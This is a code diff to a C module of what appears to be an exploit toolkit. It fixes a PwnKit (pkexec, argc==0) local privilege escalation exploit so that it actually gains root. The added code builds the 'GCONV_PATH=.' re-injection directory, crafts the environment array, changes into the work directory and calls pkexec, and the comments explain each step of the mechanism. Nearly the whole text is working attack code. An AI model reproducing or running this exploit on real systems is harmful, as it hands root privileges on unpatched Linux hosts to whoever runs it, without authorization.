@@ -314,31 +314,60 @@ static skeletonkey_result_t pwnkit_exploit(const struct skeletonkey_ctx *ctx)
         goto fail;
     }
 
+    /* 4b. The re-injection directory. This is the piece that makes the
+     *     GCONV_PATH trick actually fire, and the classic bug when it's
+     *     omitted (pkexec prints "Cannot run program pwnkit" and glibc
+     *     "Could not open converter ... to PWNKIT", and NO root is obtained).
+     *
+     *     With argc==0, pkexec reads envp[0] ("pwnkit") as the program path
+     *     and, since it isn't absolute, resolves it via PATH. We set
+     *     PATH=GCONV_PATH=. so pkexec searches a directory literally named
+     *     "GCONV_PATH=." for an executable "pwnkit"; when it finds
+     *     "GCONV_PATH=./pwnkit" it writes that string back over envp[0],
+     *     thereby RE-INJECTING GCONV_PATH=./pwnkit into the (already
+     *     sanitised) environment. pkexec then emits an error whose message
+     *     glibc converts via the PWNKIT charset, dlopen()ing ./pwnkit/PWNKIT.so
+     *     as root. So we need (a) the "GCONV_PATH=." dir + executable "pwnkit",
+     *     and (b) CWD == workdir so "./pwnkit" resolves to sodir. */
+    char injdir[1024];
+    snprintf(injdir, sizeof injdir, "%s/GCONV_PATH=.", workdir);
+    if (mkdir(injdir, 0755) < 0 && errno != EEXIST) {
+        perror("mkdir GCONV_PATH=."); goto fail;
+    }
+    char injexe[2048];
+    snprintf(injexe, sizeof injexe, "%s/pwnkit", injdir);
+    /* Content is irrelevant — it never actually runs; the payload fires during
+     * pkexec's error-message conversion before any exec of this file. It only
+     * has to exist and be executable so g_find_program_in_path() locates it. */
+    if (!write_file_str(injexe, "#!/bin/sh\n:\n")) {
+        fprintf(stderr, "[-] pwnkit: write inject exe failed\n"); goto fail;
+    }
+    chmod(injexe, 0755);
+
     if (!ctx->json) {
         fprintf(stderr, "[*] pwnkit: payload built; constructing argv=NULL + crafted envp\n");
     }
 
-    /* 5. Construct the argv-overflow trick. The env vars become argv
-     *    via the bug; pkexec parses the first as argv[0] which it
-     *    then uses to find the binary to re-exec. By naming
-     *    'GCONV_PATH=.' as argv[0], pkexec ends up in our tmpdir
-     *    with CHARSET=PWNKIT, libc's iconv loads PWNKIT.so as root.
-     *
-     *    Reference: Qualys' PWNKIT writeup. */
+    /* 5. Construct the argv-overflow trick (see 4b for the mechanism).
+     *    Reference: Qualys' PWNKIT writeup + Berdav's PoC layout. */
     char *new_argv[] = { NULL };           /* argc == 0 — the bug */
-    char gconv_env[1024];
-    snprintf(gconv_env, sizeof gconv_env, "GCONV_PATH=%s/pwnkit", workdir);
     char *envp[] = {
-        "pwnkit",                          /* becomes argv[0] via overflow */
-        "PATH=GCONV_PATH=.",                /* pkexec parses this as PATH */
+        "pwnkit",                          /* becomes argv[0]=path via the overflow */
+        "PATH=GCONV_PATH=.",                /* pkexec re-injects GCONV_PATH=./pwnkit */
         "CHARSET=PWNKIT",
         "SHELL=pwnkit",
-        gconv_env,
         NULL,
     };
     /* tighten workdir perms so pkexec (root) can traverse */
     chmod(workdir, 0755);
     chmod(sodir, 0755);
+
+    /* CWD must be the workdir so the re-injected GCONV_PATH=./pwnkit resolves
+     * to workdir/pwnkit/{gconv-modules,PWNKIT.so}. Without this the converter
+     * is never found and no root is obtained. */
+    if (chdir(workdir) != 0) {
+        perror("chdir workdir"); goto fail;
+    }
 
     if (!ctx->json) {
         fprintf(stderr, "[+] pwnkit: execve(%s) with argc=0 — going for root\n", pkexec);
